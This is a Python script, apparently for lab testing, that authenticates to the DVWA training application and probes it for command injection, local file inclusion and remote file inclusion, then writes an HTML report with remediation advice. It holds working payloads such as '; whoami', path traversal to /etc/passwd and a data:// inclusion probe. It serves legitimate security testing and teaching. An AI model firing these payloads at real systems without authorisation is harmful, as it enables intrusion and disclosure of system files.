#!/usr/bin/env python3
"""
DVWA Code Injection, LFI & RFI Testing Script
OWASP OTG-INPVAL-012, OTG-INPVAL-033, OTG-INPVAL-034 Compliance
Generates OWASP/OSCP-style HTML report
"""

import requests
from bs4 import BeautifulSoup
import argparse
import datetime
import json
import os
import sys
import urllib3
import html
import time
from urllib.parse import urljoin, quote

# Disable SSL warnings for localhost testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWACodeInjectionLFI_RFITester:
    def __init__(self, base_url, username, password, output_file, timeout=15, delay=1):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(self.base_url + '/', 'login.php')
        self.timeout = timeout
        self.delay = delay
        self.username = username
        self.password = password
        self.output_file = output_file
        self.session = requests.Session()
        # Set a user agent to avoid potential blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.endpoints = []
        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Login URL: {self.login_url}")
        
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        try:
            print(f"[*] Fetching page: {url}")
            response = self.session.get(url, verify=False, timeout=self.timeout)
            print(f"[*] Response status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try multiple methods to find CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            if not token_input:
                # Try finding by ID
                token_input = soup.find('input', {'id': 'user_token'})
            if not token_input:
                # Try finding any hidden input that might be the token
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        token_input = inp
                        break
            
            if token_input and token_input.get('value'):
                token = token_input['value']
                print(f"[+] Found CSRF token: {token[:20]}...")
                return token
            else:
                print("[-] CSRF token input not found in HTML")
                return None
                
        except Exception as e:
            print(f"[-] Error getting CSRF token: {e}")
            return None
    
    def login(self):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        try:
            # First, get the main page to establish session
            print("[*] Getting main page to establish session...")
            main_response = self.session.get(self.base_url, verify=False, timeout=self.timeout)
            print(f"[*] Main page response status: {main_response.status_code}")
            
            # Get login page to extract CSRF token
            token = self.get_csrf_token(self.login_url)
            if not token:
                print("[-] Failed to get CSRF token")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': token
            }
            
            print("[*] Sending login request...")
            response = self.session.post(self.login_url, data=login_data, allow_redirects=True, verify=False, timeout=self.timeout)
            
            # Check if login was successful
            if "Login failed" in response.text or "login.php" in response.url:
                print("[-] Login failed")
                print(f"Response URL: {response.url}")
                return False
            
            print("[+] Login successful")
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - make sure DVWA is running on localhost")
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def discover_endpoints(self):
        """Discover relevant endpoints in DVWA"""
        print("[*] Discovering relevant endpoints...")
        
        # Specific DVWA modules to test
        dvwa_modules = [
            'vulnerabilities/exec/',      # Command Execution (Code Injection)
            'vulnerabilities/fi/',        # File Inclusion (LFI/RFI)
        ]
        
        for module in dvwa_modules:
            module_url = urljoin(self.base_url + '/', module)
            try:
                print(f"[*] Checking module: {module}")
                response = self.session.get(module_url, verify=False, timeout=self.timeout)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all forms
                    forms = soup.find_all('form')
                    for i, form in enumerate(forms):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        
                        # Resolve relative URLs
                        if action:
                            full_action = urljoin(module_url, action)
                        else:
                            full_action = module_url
                        
                        # Extract form parameters
                        params = []
                        for input_field in form.find_all(['input', 'textarea', 'select']):
                            param_name = input_field.get('name')
                            param_type = input_field.get('type', 'text')
                            if param_name:
                                params.append({
                                    'name': param_name,
                                    'type': param_type
                                })
                        
                        endpoint_info = {
                            'url': full_action,
                            'method': method,
                            'parameters': params,
                            'module': module
                        }
                        
                        # Avoid duplicates
                        if endpoint_info not in self.endpoints:
                            self.endpoints.append(endpoint_info)
                            param_names = [p['name'] for p in params]
                            print(f"[+] Found endpoint: {full_action} with params: {param_names}")
                
                    # For File Inclusion, also check for GET parameters in URL
                    if 'fi' in module:
                        # Check if there are query parameters or links that might indicate file inclusion
                        links = soup.find_all('a', href=True)
                        for link in links:
                            href = link['href']
                            if 'page=' in href and 'fi/' in href:
                                # This looks like a file inclusion link
                                full_link = urljoin(module_url, href)
                                # Extract the page parameter
                                page_param = href.split('page=')[1].split('&')[0] if 'page=' in href else 'file'
                                endpoint_info = {
                                    'url': full_link.split('?')[0],  # Base URL without query params
                                    'method': 'GET',
                                    'parameters': [{'name': 'page', 'type': 'text'}],
                                    'module': module,
                                    'is_get_endpoint': True
                                }
                                
                                if endpoint_info not in self.endpoints:
                                    self.endpoints.append(endpoint_info)
                                    print(f"[+] Found FI GET endpoint: {full_link.split('?')[0]} with param: page")
                
            except Exception as e:
                print(f"[-] Error checking module {module}: {e}")
        
        print(f"[+] Discovered {len(self.endpoints)} endpoints")
    
    def test_code_injection(self):
        """Test Code Injection on Command Execution module"""
        print("[*] Testing Code Injection...")
        
        # Find Command Execution endpoint
        exec_endpoint = None
        for endpoint in self.endpoints:
            if 'exec' in endpoint['module']:
                exec_endpoint = endpoint
                break
        
        if not exec_endpoint:
            print("[-] Command Execution endpoint not found")
            return
        
        url = exec_endpoint['url']
        parameters = exec_endpoint['parameters']
        module = exec_endpoint['module']
        
        print(f"[*] Testing Code Injection on: {url}")
        print(f"[*] Available parameters: {[p['name'] for p in parameters]}")
        
        # Code Injection payloads
        code_payloads = [
            {
                'name': 'Semicolon Separator',
                'payload': '; echo CODE-INJECTION-DETECTED',
                'expected': 'CODE-INJECTION-DETECTED'
            },
            {
                'name': 'AND Operator',
                'payload': '&& echo CODE-INJECTION-DETECTED',
                'expected': 'CODE-INJECTION-DETECTED'
            },
            {
                'name': 'Pipe Operator',
                'payload': '| echo CODE-INJECTION-DETECTED',
                'expected': 'CODE-INJECTION-DETECTED'
            },
            {
                'name': 'Whoami Command',
                'payload': '; whoami',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx']
            },
            {
                'name': 'Directory Listing',
                'payload': '; ls',
                'expected': ['index', 'config', 'login']
            },
            {
                'name': 'Directory Listing (Windows)',
                'payload': '&& dir',
                'expected': ['Directory', 'File(s)', '.php']
            }
        ]
        
        # Find the command parameter (be more flexible in naming)
        cmd_param = None
        for param in parameters:
            param_name = param['name'].lower()
            if 'ip' in param_name or 'cmd' in param_name or 'command' in param_name:
                cmd_param = param['name']
                break
        
        if not cmd_param:
            # If no specific command param found, use the first text parameter
            for param in parameters:
                if param['type'] in ['text', 'textarea']:
                    cmd_param = param['name']
                    break
        
        if not cmd_param:
            print("[-] No suitable parameter found for command injection testing")
            return
        
        print(f"[*] Using parameter for injection: {cmd_param}")
        
        # Test each payload
        for payload_info in code_payloads:
            payload_name = payload_info['name']
            payload_value = payload_info['payload']
            expected_result = payload_info['expected']
            
            try:
                print(f"  [*] Testing {payload_name}")
                
                # Respect delay between requests
                time.sleep(self.delay)
                
                # Create data with payload
                data = {}
                for param in parameters:
                    if param['name'] == cmd_param:
                        data[param['name']] = payload_value
                    else:
                        # Set default values for other parameters
                        if 'name' in param['name'].lower():
                            data[param['name']] = 'test'
                        elif 'submit' in param['name'].lower():
                            data[param['name']] = 'Submit'
                        else:
                            data[param['name']] = '127.0.0.1'  # Default IP for exec module
                
                print(f"  [*] Sending data: {data}")
                
                # Send request
                response = self.session.post(url, data=data, verify=False, timeout=self.timeout)
                
                # Analyze response
                result = {
                    'url': url,
                    'module': module,
                    'vuln_type': 'Code Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'vulnerable': False,
                    'description': '',
                    'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                }
                
                # Check for code injection indicators
                response_lower = response.text.lower()
                
                if isinstance(expected_result, list):
                    # Check for any of the expected strings
                    for expected in expected_result:
                        if expected.lower() in response_lower:
                            result['vulnerable'] = True
                            result['description'] = f"Found expected result: {expected}"
                            break
                else:
                    # Check for single expected string
                    if expected_result.lower() in response_lower:
                        result['vulnerable'] = True
                        result['description'] = f"Found expected result: {expected_result}"
                
                # Additional checks for common command injection indicators
                cmd_indicators = [
                    'uid=',
                    'gid=',
                    'groups=',
                    'root:x:',
                    'administrator',
                    'www-data',
                    'apache',
                    'nginx',
                    'directory of',
                    'volume in drive'
                ]
                
                for indicator in cmd_indicators:
                    if indicator in response_lower and not result['vulnerable']:
                        result['vulnerable'] = True
                        result['description'] = f"Found command injection indicator: {indicator}"
                        break
                
                self.results.append(result)
                
                if result['vulnerable']:
                    print(f"  [+] VULNERABLE: {payload_name} - {result['description']}")
                else:
                    print(f"  [-] NOT VULNERABLE: {payload_name}")
                
            except Exception as e:
                print(f"  [-] Error testing {payload_name}: {e}")
                self.results.append({
                    'url': url,
                    'module': module,
                    'vuln_type': 'Code Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'status_code': 0,
                    'response_length': 0,
                    'vulnerable': False,
                    'description': f'Error: {str(e)}',
                    'error': True
                })
    
    def test_lfi_rfi(self):
        """Test LFI and RFI on File Inclusion module"""
        print("[*] Testing LFI/RFI...")
        
        # Find File Inclusion endpoint
        fi_endpoints = []
        for endpoint in self.endpoints:
            if 'fi' in endpoint['module']:
                fi_endpoints.append(endpoint)
        
        if not fi_endpoints:
            print("[-] File Inclusion endpoint not found")
            return
        
        for fi_endpoint in fi_endpoints:
            url = fi_endpoint['url']
            parameters = fi_endpoint['parameters']
            module = fi_endpoint['module']
            method = fi_endpoint.get('method', 'GET')
            
            print(f"[*] Testing LFI/RFI on: {url} (Method: {method})")
            print(f"[*] Available parameters: {[p['name'] for p in parameters]}")
            
            # LFI payloads
            lfi_payloads = [
                {
                    'name': 'Basic LFI - /etc/passwd',
                    'payload': '../../../../etc/passwd',
                    'expected': ['root:x:', 'daemon:x:', 'bin:x:'],
                    'type': 'LFI'
                },
                {
                    'name': 'Basic LFI - Windows hosts',
                    'payload': '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    'expected': ['127.0.0.1', 'localhost'],
                    'type': 'LFI'
                },
                {
                    'name': 'URL Encoded LFI',
                    'payload': '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
                    'expected': ['root:x:', 'daemon:x:'],
                    'type': 'LFI'
                },
                {
                    'name': 'Windows win.ini',
                    'payload': '..\\..\\..\\..\\windows\\win.ini',
                    'expected': ['[fonts]', '[extensions]'],
                    'type': 'LFI'
                }
            ]
            
            # RFI payloads (simulated - using data URI)
            rfi_payloads = [
                {
                    'name': 'Data URI',
                    'payload': 'data://text/plain,RFI-TEST',
                    'expected': 'RFI-TEST',
                    'type': 'RFI'
                }
            ]
            
            # Find the file parameter (be more flexible)
            file_param = None
            for param in parameters:
                param_name = param['name'].lower()
                if 'page' in param_name or 'file' in param_name:
                    file_param = param['name']
                    break
            
            if not file_param and parameters:
                # Use the first parameter if no specific file param found
                file_param = parameters[0]['name']
            
            if not file_param:
                print("[-] File parameter not found")
                continue
            
            print(f"[*] Using file parameter: {file_param}")
            
            # Test LFI payloads
            all_payloads = lfi_payloads + rfi_payloads
            
            for payload_info in all_payloads:
                payload_name = payload_info['name']
                payload_value = payload_info['payload']
                expected_result = payload_info['expected']
                vuln_type = payload_info['type']
                
                try:
                    print(f"  [*] Testing {vuln_type} - {payload_name}")
                    
                    # Respect delay between requests
                    time.sleep(self.delay)
                    
                    if method.upper() == 'GET':
                        # Create parameters for GET request
                        params = {file_param: payload_value}
                        print(f"  [*] Sending GET params: {params}")
                        # Send request
                        response = self.session.get(url, params=params, verify=False, timeout=self.timeout)
                    else:
                        # Create data for POST request
                        data = {file_param: payload_value}
                        print(f"  [*] Sending POST data: {data}")
                        # Send request
                        response = self.session.post(url, data=data, verify=False, timeout=self.timeout)
                    
                    # Analyze response
                    result = {
                        'url': url,
                        'module': module,
                        'vuln_type': vuln_type,
                        'parameter': file_param,
                        'payload_name': payload_name,
                        'payload': payload_value,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'vulnerable': False,
                        'description': '',
                        'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                    }
                    
                    # Check for LFI/RFI indicators
                    response_lower = response.text.lower()
                    
                    if isinstance(expected_result, list):
                        # Check for any of the expected strings
                        for expected in expected_result:
                            if expected.lower() in response_lower:
                                result['vulnerable'] = True
                                result['description'] = f"Found expected result: {expected}"
                                break
                    else:
                        # Check for single expected string
                        if expected_result.lower() in response_lower:
                            result['vulnerable'] = True
                            result['description'] = f"Found expected result: {expected_result}"
                    
                    # Additional checks for common LFI indicators
                    if vuln_type == 'LFI':
                        lfi_indicators = [
                            'root:x:',
                            'daemon:x:',
                            'bin:x:',
                            '[fonts]',
                            '[extensions]',
                            '127.0.0.1 localhost',
                            'uid=',
                            'gid='
                        ]
                        
                        for indicator in lfi_indicators:
                            if indicator in response.text and not result['vulnerable']:
                                result['vulnerable'] = True
                                result['description'] = f"Found LFI indicator: {indicator}"
                                break
                    
                    # Check for RFI indicators
                    elif vuln_type == 'RFI':
                        if 'RFI-TEST' in response.text:
                            result['vulnerable'] = True
                            result['description'] = "Found RFI test string in response"
                    
                    self.results.append(result)
                    
                    if result['vulnerable']:
                        print(f"  [+] VULNERABLE: {vuln_type} - {payload_name} - {result['description']}")
                    else:
                        print(f"  [-] NOT VULNERABLE: {vuln_type} - {payload_name}")
                    
                except Exception as e:
                    print(f"  [-] Error testing {vuln_type} - {payload_name}: {e}")
                    self.results.append({
                        'url': url,
                        'module': module,
                        'vuln_type': vuln_type,
                        'parameter': file_param,
                        'payload_name': payload_name,
                        'payload': payload_value,
                        'status_code': 0,
                        'response_length': 0,
                        'vulnerable': False,
                        'description': f'Error: {str(e)}',
                        'error': True
                    })
    
    def generate_html_report(self):
        """Generate OWASP/OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        
        # Separate results by vulnerability type
        code_injection_results = [r for r in self.results if r.get('vuln_type') == 'Code Injection']
        lfi_results = [r for r in self.results if r.get('vuln_type') == 'LFI']
        rfi_results = [r for r in self.results if r.get('vuln_type') == 'RFI']
        
        code_injection_vuln = sum(1 for r in code_injection_results if r.get('vulnerable', False))
        lfi_vuln = sum(1 for r in lfi_results if r.get('vulnerable', False))
        rfi_vuln = sum(1 for r in rfi_results if r.get('vulnerable', False))
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Injection, LFI & RFI Assessment - DVWA</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.2em;
        }}
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
        }}
        .section {{
            background: white;
            margin-bottom: 25px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .section-title {{
            color: #2a5298;
            border-bottom: 2px solid #2a5298;
            padding-bottom: 10px;
            margin-top: 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #2a5298;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffebee;
            color: #c62828;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .not-vulnerable {{
            background-color: #e8f5e8;
            color: #2e7d32;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .code {{
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
            white-space: pre-wrap;
        }}
        .risk-high {{
            color: #d32f2f;
            font-weight: bold;
        }}
        .risk-medium {{
            color: #f57c00;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        .summary-box {{
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #1e88e5;
        }}
        .findings-summary {{
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }}
        .finding-item {{
            padding: 15px;
            border-radius: 8px;
            color: white;
        }}
        .finding-vuln {{
            background-color: #d32f2f;
        }}
        .finding-safe {{
            background-color: #388e3c;
        }}
        code {{
            font-family: 'Courier New', monospace;
            background-color: #f5f5f5;
            padding: 2px 4px;
            border-radius: 3px;
        }}
        .tab {{
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
            border-radius: 5px 5px 0 0;
        }}
        .tab button {{
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
            font-size: 16px;
        }}
        .tab button:hover {{
            background-color: #ddd;
        }}
        .tab button.active {{
            background-color: #2a5298;
            color: white;
        }}
        .tabcontent {{
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
            border-radius: 0 0 5px 5px;
            background-color: white;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Code Injection, LFI & RFI Assessment</h1>
        <p>DVWA Security Test - OWASP Testing Guide OTG-INPVAL-012, 033, 034</p>
    </div>

    <div class="section">
        <h2 class="section-title">Executive Summary</h2>
        <div class="summary-box">
            <p>This assessment identified <span class="risk-high">{vulnerable_count} vulnerabilities</span> in the DVWA application including Code Injection ({code_injection_vuln}), Local File Inclusion ({lfi_vuln}), and Remote File Inclusion ({rfi_vuln}). These vulnerabilities can lead to remote code execution, sensitive information disclosure, and complete system compromise.</p>
        </div>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{vulnerable_count}</h3>
                <p>Total Vulnerabilities</p>
            </div>
            <div class="finding-item finding-safe">
                <h3>{len(self.results) - vulnerable_count}</h3>
                <p>Secure Tests</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Test Details</h2>
        <table>
            <tr>
                <td><strong>Target Application</strong></td>
                <td>Damn Vulnerable Web Application (DVWA)</td>
            </tr>
            <tr>
                <td><strong>Test Types</strong></td>
                <td>Code Injection, Local File Inclusion, Remote File Inclusion</td>
            </tr>
            <tr>
                <td><strong>OWASP Test IDs</strong></td>
                <td>OTG-INPVAL-012, OTG-INPVAL-033, OTG-INPVAL-034</td>
            </tr>
            <tr>
                <td><strong>Risk Level</strong></td>
                <td><span class="risk-high">High</span></td>
            </tr>
            <tr>
                <td><strong>Test Date</strong></td>
                <td>{timestamp}</td>
            </tr>
            <tr>
                <td><strong>Target URL</strong></td>
                <td>{self.base_url}</td>
            </tr>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Methodology</h2>
        <p>The testing methodology followed the OWASP Testing Guide for Code Injection, LFI, and RFI:</p>
        <ol>
            <li><strong>Authentication</strong>: Logged into DVWA with provided credentials</li>
            <li><strong>Module Identification</strong>: Identified Command Execution and File Inclusion modules</li>
            <li><strong>Code Injection Testing</strong>: Tested various command injection payloads in the Command Execution module</li>
            <li><strong>LFI/RFI Testing</strong>: Tested path traversal and remote inclusion payloads in the File Inclusion module</li>
            <li><strong>Analysis</strong>: Documented vulnerable endpoints and payloads</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">Vulnerability Summary</h2>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{code_injection_vuln}</h3>
                <p>Code Injection</p>
            </div>
            <div class="finding-item finding-vuln">
                <h3>{lfi_vuln}</h3>
                <p>Local File Inclusion</p>
            </div>
            <div class="finding-item finding-vuln">
                <h3>{rfi_vuln}</h3>
                <p>Remote File Inclusion</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Detailed Findings</h2>
        
        <div class="tab">
            <button class="tablinks active" onclick="openTab(event, 'codeinjection')">Code Injection</button>
            <button class="tablinks" onclick="openTab(event, 'lfi')">Local File Inclusion</button>
            <button class="tablinks" onclick="openTab(event, 'rfi')">Remote File Inclusion</button>
        </div>

        <div id="codeinjection" class="tabcontent" style="display:block">
            <h3>Code Injection Results</h3>
            <p>The following Code Injection tests were conducted:</p>
            <table>
                <thead>
                    <tr>
                        <th>Module</th>
                        <th>Parameter</th>
                        <th>Payload Name</th>
                        <th>Status</th>
                        <th>Status Code</th>
                    </tr>
                </thead>
                <tbody>"""
        
        # Code Injection results
        for result in code_injection_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                    <tr>
                        <td>{html.escape(result.get('module', 'Unknown'))}</td>
                        <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                        <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                        <td><span class="{status_class}">{status_text}</span></td>
                        <td>{result.get('status_code', 'N/A')}</td>
                    </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                    <tr>
                        <td colspan="5" style="background-color: #fff3e0;">
                            <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                            <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                        </td>
                    </tr>"""
        
        html_content += f"""
                </tbody>
            </table>
            
            <h4>Code Injection Vulnerabilities</h4>"""
        
        # Show only vulnerable Code Injection results
        vulnerable_code_results = [r for r in code_injection_results if r.get('vulnerable', False)]
        
        if vulnerable_code_results:
            for i, result in enumerate(vulnerable_code_results, 1):
                html_content += f"""
            <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
            </div>"""
        else:
            html_content += """
            <p>No Code Injection vulnerabilities were found.</p>"""
        
        html_content += """
        </div>

        <div id="lfi" class="tabcontent">
            <h3>Local File Inclusion Results</h3>
            <p>The following LFI tests were conducted:</p>
            <table>
                <thead>
                    <tr>
                        <th>Module</th>
                        <th>Parameter</th>
                        <th>Payload Name</th>
                        <th>Status</th>
                        <th>Status Code</th>
                    </tr>
                </thead>
                <tbody>"""
        
        # LFI results
        for result in lfi_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                    <tr>
                        <td>{html.escape(result.get('module', 'Unknown'))}</td>
                        <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                        <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                        <td><span class="{status_class}">{status_text}</span></td>
                        <td>{result.get('status_code', 'N/A')}</td>
                    </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                    <tr>
                        <td colspan="5" style="background-color: #fff3e0;">
                            <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                            <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                        </td>
                    </tr>"""
        
        html_content += f"""
                </tbody>
            </table>
            
            <h4>Local File Inclusion Vulnerabilities</h4>"""
        
        # Show only vulnerable LFI results
        vulnerable_lfi_results = [r for r in lfi_results if r.get('vulnerable', False)]
        
        if vulnerable_lfi_results:
            for i, result in enumerate(vulnerable_lfi_results, 1):
                html_content += f"""
            <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
            </div>"""
        else:
            html_content += """
            <p>No Local File Inclusion vulnerabilities were found.</p>"""
        
        html_content += """
        </div>

        <div id="rfi" class="tabcontent">
            <h3>Remote File Inclusion Results</h3>
            <p>The following RFI tests were conducted:</p>
            <table>
                <thead>
                    <tr>
                        <th>Module</th>
                        <th>Parameter</th>
                        <th>Payload Name</th>
                        <th>Status</th>
                        <th>Status Code</th>
                    </tr>
                </thead>
                <tbody>"""
        
        # RFI results
        for result in rfi_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                    <tr>
                        <td>{html.escape(result.get('module', 'Unknown'))}</td>
                        <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                        <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                        <td><span class="{status_class}">{status_text}</span></td>
                        <td>{result.get('status_code', 'N/A')}</td>
                    </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                    <tr>
                        <td colspan="5" style="background-color: #fff3e0;">
                            <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                            <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                        </td>
                    </tr>"""
        
        html_content += f"""
                </tbody>
            </table>
            
            <h4>Remote File Inclusion Vulnerabilities</h4>"""
        
        # Show only vulnerable RFI results
        vulnerable_rfi_results = [r for r in rfi_results if r.get('vulnerable', False)]
        
        if vulnerable_rfi_results:
            for i, result in enumerate(vulnerable_rfi_results, 1):
                html_content += f"""
            <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
            </div>"""
        else:
            html_content += """
            <p>No Remote File Inclusion vulnerabilities were found.</p>"""
        
        html_content += """
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Attack Techniques</h2>
        
        <h3>Code Injection</h3>
        <p>Code Injection occurs when applications execute user-supplied input as system commands:</p>
        <ul>
            <li><strong>Command Separators</strong>: Using <code>;</code>, <code>&&</code>, <code>|</code> to chain commands</li>
            <li><strong>Blind Injection</strong>: Using time-based payloads to detect command execution</li>
            <li><strong>Information Disclosure</strong>: Executing commands to read system information</li>
        </ul>
        
        <h3>Local File Inclusion (LFI)</h3>
        <p>LFI allows attackers to include local files on the server:</p>
        <ul>
            <li><strong>Path Traversal</strong>: Using <code>../</code> to navigate directories</li>
            <li><strong>Null Byte Injection</strong>: Using <code>%00</code> to bypass file extension checks</li>
            <li><strong>Log Poisoning</strong>: Including log files to execute injected code</li>
        </ul>
        
        <h3>Remote File Inclusion (RFI)</h3>
        <p>RFI allows attackers to include remote files:</p>
        <ul>
            <li><strong>HTTP Inclusion</strong>: Including files from remote HTTP servers</li>
            <li><strong>FTP Inclusion</strong>: Including files from FTP servers</li>
            <li><strong>Data URIs</strong>: Using data:// wrappers to include inline content</li>
        </ul>
    </div>

    <div class="section">
        <h2 class="section-title">Remediation Recommendations</h2>
        <p>To prevent Code Injection, LFI, and RFI vulnerabilities, implement the following measures:</p>
        
        <h3>Code Injection Prevention</h3>
        <ol>
            <li><strong>Input Validation</strong>: Validate and sanitize all user input, especially command parameters</li>
            <li><strong>Whitelist Approach</strong>: Use whitelists for allowed commands and parameters</li>
            <li><strong>Secure APIs</strong>: Use secure APIs instead of system calls when possible</li>
            <li><strong>Privilege Separation</strong>: Run applications with minimal privileges</li>
        </ol>
        
        <h3>LFI/RFI Prevention</h3>
        <ol>
            <li><strong>Disable Dangerous Functions</strong>: Disable allow_url_include and register_globals in PHP</li>
            <li><strong>Input Validation</strong>: Validate file paths and restrict file inclusion to specific directories</li>
            <li><strong>Whitelist Files</strong>: Use a whitelist of allowed files for inclusion</li>
            <li><strong>Web Server Configuration</strong>: Configure web servers to prevent directory traversal</li>
            <li><strong>Secure Coding Practices</strong>: Avoid dynamic file inclusion based on user input</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Code_Injection">OWASP Testing Guide - OTG-INPVAL-012</a></li>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_Local_File_Inclusion">OWASP Testing Guide - OTG-INPVAL-033</a></li>
